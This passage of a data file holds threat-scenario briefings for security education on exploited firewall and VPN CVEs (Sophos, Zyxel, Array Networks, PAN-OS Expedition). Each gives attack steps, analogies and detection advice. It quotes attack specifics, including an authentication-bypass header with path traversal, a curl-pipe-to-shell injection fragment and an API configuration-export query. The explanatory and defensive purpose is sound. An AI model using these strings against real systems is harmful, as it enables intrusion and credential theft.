        howItWorksInPractice:
          'Using a stolen `LUFRPT1...` API key, the attacker could immediately query `https://<firewall>/api/?type=export&category=configuration` or create administrative accounts on production PAN-OS firewalls.',
        diagramAlignment:
          'Vector #3.1 traces the Expedition MySQL DB credential dump pivoting directly into Managed PAN-OS Firewalls (`API Keys`).',
        detectionAndEvidence:
          'PAN-OS system/config logs showing XML API requests (`type=export`, `type=config`, `type=op`) originating from the Expedition host IP or unknown internal hosts.',
      },
    ],
  },
  'sophos-firewall-cve-2022-3236-asnarok': {
    scenarioId: 'sophos-firewall-cve-2022-3236-asnarok',
    briefing: {
      headline:
        'Threat actor DriftingCloud exploits an unauthenticated code injection zero-day (CVE-2022-3236) in the User Portal and Webadmin interfaces of Sophos Firewall via null-byte JSON mode=151 login requests, gaining root execution.',
      storyAnalogy:
        'Imagine a two-person security desk where the front guard checks that your name badge only has normal letters, but stops reading as soon as they hit an invisible blank spot (null byte). The back-office clerk reads right past the blank spot and types the rest of your badge into the master control computer.',
      plainSummary:
        'In September 2022, Sophos and Volexity disclosed CVE-2022-3236 (CVSS 9.8), an unauthenticated code injection vulnerability in Sophos Firewall v19.0 MR1 and older exploited as a zero-day by China-nexus APT DriftingCloud. By sending a crafted mode=151 JSON login request containing non-printable ASCII bytes (%00 / \\u0000) and shell commands to /userportal/Controller or /webconsole/Controller, attackers bypassed the Java servlet filter and achieved root command execution in the backend csc service.',
      diagramTopologySummary:
        'DriftingCloud Operator (JSON Payload) -> Sophos Firewall (User Portal / Webadmin) -> csc Service Daemon (Root Execution) -> Intercepted VPN Credentials & Internal LAN -> Volexity / Sophos X-Ops Telemetry.',
      documentedAdvisory:
        'Sophos Security Advisory (CVE-2022-3236) / Volexity DriftingCloud Zero-Day Analysis / CISA Known Exploited Vulnerabilities',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Crafted JSON mode=151 Request to /userportal/Controller (CVE-2022-3236)',
        storyAnalogy:
          'Imagine a two-person security desk where the front guard checks that your name badge only has normal letters, but stops reading as soon as they hit an invisible blank spot (`null byte`). The back-office clerk reads right past the blank spot and types the rest of your badge into the master control computer.',
        simpleExplanation:
          'DriftingCloud sent an unauthenticated HTTP POST request to `/userportal/Controller` (or `/webconsole/Controller`) with `mode=151` and a `json` parameter whose `"username"` field contained a null byte (`\\u0000`) or newline followed by backtick shell commands. This exploited `CVE-2022-3236` (a parser differential between the front-end Java servlet filter, which stopped validating at the null byte, and the backend `csc` service, which processed the full string).',
        howItWorksInPractice:
          'Because `mode=151` is the standard pre-authentication login request handler for both the User Portal and Webadmin, the exploit worked without any prior credentials.',
        diagramAlignment:
          'Vector #1.1 links the DriftingCloud Operator to the Sophos Firewall (`User Portal / Webadmin`) via `POST /userportal/Controller`.',
        detectionAndEvidence:
          'Sophos `/log/apache_access.log` and WAF alerts for `mode=151` requests containing `%00`, `\\u0000`, `%0a`, or shell metacharacters in the `json` parameter.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'Cyberoam System Controller (csc) Perl/Shell Evaluation as Root',
        storyAnalogy:
          'The back-office controller (`csc`), which runs with master building keys, reads the second half of the forged badge and executes it as a root shell command.',
        simpleExplanation:
          'When the front-end Java controller forwarded the JSON payload to the backend `Cyberoam System Controller (csc)` daemon, `csc` evaluated the unsanitized parameter inside a privileged Perl/shell routine running as `root` (`UID 0`), spawning `/bin/sh -c` to fetch and execute DriftingCloud’s second-stage shell script in memory.',
        howItWorksInPractice:
          'Volexity observed DriftingCloud using this primitive to selectively target high-value organizations in South Asia while leaving minimal disk artifacts.',
        diagramAlignment:
          'Vector #2.1 connects the Sophos Firewall web controller to the `csc` Service Daemon (`Root Execution`) and alerts the Volexity / Sophos X-Ops Telemetry sensor.',
        detectionAndEvidence:
          'Entries in `/log/csc.log` indicating malformed opcode/JSON parsing errors and child `/bin/sh` processes spawned by `/bin/csc`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1556',
        plainTitle: 'Trojanized Login CGI Credential Harvesting & Persistent Reverse Tunnel',
        storyAnalogy:
          'With control of the firewall, the spy wires a secret recorder into the login page to write down every employee’s VPN password and digs a hidden tunnel into the internal office network.',
        simpleExplanation:
          'Running as `root` on the perimeter appliance, DriftingCloud modified the User Portal/Webadmin authentication scripts to intercept and log cleartext passwords to a hidden stash file (`/var/tmp/.auth.log`) whenever legitimate users or administrators logged in, and launched a persistent `socat` TLS reverse relay to proxy traffic directly into the internal corporate LAN.',
        howItWorksInPractice:
          'Even after the CVE-2022-3236 hotfix was applied, harvested cleartext VPN and Active Directory credentials allowed the threat actor to authenticate legitimately unless passwords were rotated.',
        diagramAlignment:
          'Vector #3.1 traces the `csc` root execution modifying the authentication handler to capture Intercepted VPN Credentials & Internal LAN access.',
        detectionAndEvidence:
          'Filesystem integrity verification of `/usr/share/userportal` and `/usr/share/webconsole`, detection of unauthorized `socat`/`ssh` processes on the firewall, and outbound TLS connections originating from the appliance.',
      },
    ],
  },
  'zyxel-firewall-cve-2023-28771-ike-rce': {
    scenarioId: 'zyxel-firewall-cve-2023-28771-ike-rce',
    briefing: {
      headline:
        'Attackers send a single unauthenticated IKEv2 UDP packet to port 500 on Zyxel firewalls (CVE-2023-28771), exploiting a debug logging flaw in /sbin/sshipsecpm that passes unsanitized Notify payload data directly to system() as root.',
      storyAnalogy:
        'Imagine a night watchman at a fortress gate (`UDP Port 500`) who keeps a diary by typing an `echo` command into a root computer terminal every time someone shouts an error message at the gate. A saboteur shouts an error message with a semicolon in the middle: "Bad Password; unlock the gate and hand me the keys!" The watchman types the whole sentence into the root terminal.',
      plainSummary:
        'Discovered by TRAPA Security and analyzed with a full PoC by Rapid7 in May 2023, CVE-2023-28771 is a CVSS 9.8 pre-authentication command injection vulnerability in Zyxel ZyWALL, ATP, USG FLEX, and VPN firewalls. When `/sbin/sshipsecpm` receives an `IKE_SA_INIT` packet on UDP port 500 containing a crafted Notify payload (Type 14), it decrypts a 48-byte DES-CBC block using a hardcoded key and passes the remaining string into `string_to_binary()` and `cmd_sn_write_log()`, which constructs `echo <string> >> /tmp/sdwan_vpndebug.log` and calls `system()` as `root`.',
      diagramTopologySummary:
        'External Attacker (UDP/500 IKEv2 Packet) -> Zyxel Firewall WAN (UDP Port 500) -> /sbin/sshipsecpm (string_to_binary -> system) -> ZLD Appliance Root & LAN Interfaces -> TRAPA / Rapid7 Network Sensor.',
      documentedAdvisory:
        'Zyxel Security Advisory ZSA-23-05 (CVE-2023-28771) / Rapid7 AttackerKB Technical Analysis & PoC / CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Crafted Unauthenticated IKEv2 SA_INIT Notify Packet on UDP Port 500',
        storyAnalogy:
          'Because UDP requires no handshake, the attacker fires a single "knock" packet at port 500 carrying a hidden shell command inside an error notification field.',
        simpleExplanation:
          'The attacker sent a single unauthenticated `UDP` packet to port `500` on the Zyxel WAN interface containing an `IKEv2_SA_INIT` header (Exchange Type 34) and a `Notify` payload (Message Type 14, `NO_PROPOSAL_CHOSEN`) whose notification data began with 48 bytes of ciphertext encrypted with a static DES-CBC key embedded in Zyxel’s firmware, immediately followed by `;curl http://.../s | sh;`.',
        howItWorksInPractice:
          'Because UDP is connectionless, an attacker can exploit the vulnerability in a single packet or even spoof the source IP address when firing blind commands.',
        diagramAlignment:
          'Vector #1.1 links the External Attacker (`UDP/500 IKEv2 Packet`) to the Zyxel Firewall WAN (`UDP Port 500`).',
        detectionAndEvidence:
          'Suricata/Snort network IDS rules inspecting inbound UDP/500 IKEv2 Notify Type 14 payloads exceeding expected length (>64 bytes) or containing ASCII shell metacharacters (`;`, `` ` ``, `$()`).',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: '/sbin/sshipsecpm string_to_binary() & cmd_sn_write_log() Shell Injection',
        storyAnalogy:
          'Instead of writing the error note into the logbook with a pen, the VPN daemon opens a root command shell and runs `echo [untrusted note] >> logfile`.',
        simpleExplanation:
          'Inside `/sbin/sshipsecpm`, the function `ikev2_packet_st_input_start` passed the Notify data to `string_to_binary()`, which decrypted the first 48 bytes using a hardcoded DES-CBC key (`0x01020304...`) and logged any length mismatch by calling `cmd_sn_write_log()` (a helper function that formatted `echo <unsanitized_packet_data> >> /tmp/sdwan_vpndebug.log` and passed the string directly to `system()`, allowing `;cmd;` to break out of the `echo` statement and execute as `root`).',
        howItWorksInPractice:
          'Rapid7’s reverse engineering showed that `string_to_binary()` did not terminate or sanitize the trailing plaintext bytes after the 48-byte DES-CBC block, handing the raw attacker command string straight to `cmd_sn_write_log()`.',
        diagramAlignment:
          'Vector #2.1 connects the Zyxel Firewall WAN interface to `/sbin/sshipsecpm` (`string_to_binary -> system`) and alerts the TRAPA / Rapid7 Network Sensor.',
        detectionAndEvidence:
          'Inspecting `/tmp/sdwan_vpndebug.log` on the Zyxel appliance for injected command strings and monitoring `/sbin/sshipsecpm` child processes.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1552.001',
        plainTitle: 'Root Persistence, IPSec VPN Credential Theft & Internal LAN Pivot',
        storyAnalogy:
          'Now running as the master of the firewall, the attacker steals the saved VPN passwords from the configuration file and opens the firewall gates to the internal office network.',
        simpleExplanation:
          'With `root` execution on the embedded ZyLD Linux OS, the attacker extracted `/conf/startup-config.conf` (harvesting local administrator hashes, SSL/IPSec VPN user credentials, and site-to-site VPN pre-shared keys), inserted permissive `iptables` rules, and established a reverse shell to pivot into the internal corporate LAN.',
        howItWorksInPractice:
          'Both ransomware initial-access brokers and botnet operators rapidly weaponized CVE-2023-28771 across tens of thousands of exposed Zyxel appliances worldwide.',
        diagramAlignment:
          'Vector #3.1 traces `/sbin/sshipsecpm` root execution compromising the ZLD Appliance Root & LAN Interfaces.',
        detectionAndEvidence:
          'Unexpected outbound TCP/HTTP connections initiated from the Zyxel WAN interface itself and unauthorized modifications to `/conf/startup-config.conf` or `iptables` chains.',
      },
    ],
  },
  'array-networks-ag-vxag-cve-2023-28461': {
    scenarioId: 'array-networks-ag-vxag-cve-2023-28461',
    briefing: {
      headline:
        'Earth Kasha (MirrorFace / APT10 subgroup) exploits CVE-2023-28461 in Array Networks AG/vxAG SSL VPN gateways via a crafted X-AN-FILESHARE flags header to deploy webshells, establish a SOCKS5 pivot, and launch LODEINFO and NOOPDOOR on internal Windows hosts.',
      storyAnalogy:
        'Imagine a VIP hotel entrance where the internal intercom header (`X-AN-FILESHARE`) has a status checkbox labeled "Already Verified by Front Desk (`flags=c3248`)." A spy walks straight from the street, hands the bellhop a note with that checkbox ticked and a "../../../../" path, and walks into the hotel’s security room—using it as a staging base to sneak into guest suites.',
      plainSummary:
        'Reported by JPCERT/CC and analyzed by Trend Micro and Unit 42 in campaigns attributed to Earth Kasha (MirrorFace), CVE-2023-28461 (CVSS 9.8) is a critical authentication bypass and path traversal flaw in ArrayOS AG (< 9.4.0.484) on Array Networks SSL VPN gateways. By sending an HTTP request to `/prx/000/http/localhost/client_sec/...` containing the header `X-AN-FILESHARE: ... flags=c3248; fshare_template=../../../../`, an unauthenticated attacker bypasses session authentication, reads gateway configurations, drops a PHP webshell and SOCKS5 relay (`s5n`), and pivots to internal Windows machines to deploy `LODEINFO` and `NOOPDOOR`.',
      diagramTopologySummary:
        'Earth Kasha (MirrorFace) Operator -> Array AG SSL VPN (/prx/000/http/localhost) -> ArrayOS Web Root (cals.php Webshell) -> Internal Windows Host (LODEINFO / NOOPDOOR) -> JPCERT/CC & Trend Micro Sensor.',
      documentedAdvisory:
        'Array Networks Security Advisory (CVE-2023-28461) / JPCERT/CC & Trend Micro Earth Kasha (MirrorFace) Analysis / CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'X-AN-FILESHARE flags=00300 Header Authentication Bypass (CVE-2023-28461)',
        storyAnalogy:
          'An external visitor attaches an internal routing slip (`X-AN-FILESHARE`) to their request with the "pre-approved" bit switched on, fooling the gateway into skipping login completely.',
        simpleExplanation:
          'Earth Kasha sent an unauthenticated HTTP request to `/prx/000/http/localhost/client_sec/%00/add_folder` supplying the custom header `X-AN-FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248; fshare_template=../../../../`. Because the ArrayOS reverse proxy failed to strip external `X-AN-FILESHARE` headers (`CVE-2023-28461`) and trusted the `00300` bitmask inside `flags=c3248` as proof of an authenticated FileShare session, the backend processed `fshare_template` with `../` directory traversal without requiring a login.',
        howItWorksInPractice:
          'Combining the `flags` authentication bypass with the `fshare_template` relative path traversal gave unauthenticated attackers arbitrary file read and script execution on the SSL VPN appliance.',
        diagramAlignment:
          'Vector #1.1 links the Earth Kasha (`MirrorFace`) Operator to the Array AG SSL VPN (`/prx/000/http/localhost`) endpoint.',
        detectionAndEvidence:
          'WAF/IDS inspection for external HTTP requests containing the `X-AN-FILESHARE` header or `/prx/000/http/localhost/client_sec` URIs with `%00` or `..` sequences.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1505.003',
        plainTitle: 'Arbitrary File Read of Gateway Configs & PHP Webshell Deployment',
        storyAnalogy:
          'Once inside the VPN gateway, the spy copies the gateway’s master password file, plants a hidden web command page, and sets up an invisible tunnel (`s5n`) into the corporate network.',
        simpleExplanation:
          'Using the CVE-2023-28461 primitive, Earth Kasha read `/ca/conf/default.ampled` (extracting local VPN accounts, RADIUS/LDAP secrets, and internal routing tables), wrote a PHP webshell (`cals.php`) into the ArrayOS web root, and launched a custom ELF SOCKS5 proxy binary (`/tmp/s5n`, turning the perimeter SSL VPN appliance into a transparent pivot relay into the internal corporate network).',
        howItWorksInPractice:
          'Because internal firewalls and EDRs expect user traffic to originate from the SSL VPN appliance’s internal interface IP, routing attacker traffic through `/tmp/s5n` blended in with legitimate remote-worker traffic.',
        diagramAlignment:
          'Vector #2.1 connects the Array AG SSL VPN to the ArrayOS Web Root (`cals.php Webshell`) and triggers the JPCERT/CC & Trend Micro Sensor.',
        detectionAndEvidence:
          'ArrayOS filesystem auditing for newly created `.php` files, unauthorized ELF listeners in `/tmp` (`s5n`), and unexpected SMB/WMI connections originating from the VPN gateway’s internal IP.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1127.001',
        plainTitle: 'Internal Lateral Movement & LODEINFO / NOOPDOOR Memory Injection',
        storyAnalogy:
          'Stepping out of the VPN tunnel onto internal Windows computers, the spy uses Microsoft’s own compiler tool (`MSBuild.exe`) and a signed antivirus helper to run espionage implants purely in memory.',
        simpleExplanation:
          'Pivoting through `/tmp/s5n` with credentials harvested from the gateway, Earth Kasha moved laterally onto internal Windows servers and executed `NOOPDOOR` via `MSBuild.exe C:\\ProgramData\\update.xml` (abusing the signed Microsoft `.NET` build engine to compile and execute inline C# task code directly in memory without dropping a `.exe`) alongside `LODEINFO` (loaded via DLL side-loading of `K7DbgMN.dll` by the legitimate signed binary `K7SysMn1.exe`).',
        howItWorksInPractice:
          '`LODEINFO` and `NOOPDOOR` then performed Active Directory reconnaissance, document theft, and encrypted C2 communication back through the compromised Array AG gateway.',
        diagramAlignment:
          'Vector #3.1 traces the ArrayOS SOCKS5 relay pivoting to the Internal Windows Host (`LODEINFO / NOOPDOOR`).',
        detectionAndEvidence:
          'Sysmon EventID 1 & 7 alerting on `MSBuild.exe` loading `.xml` files from `C:\\ProgramData` and `K7SysMn1.exe` side-loading unsigned `K7DbgMN.dll`.',
      },
    ],
  },
};
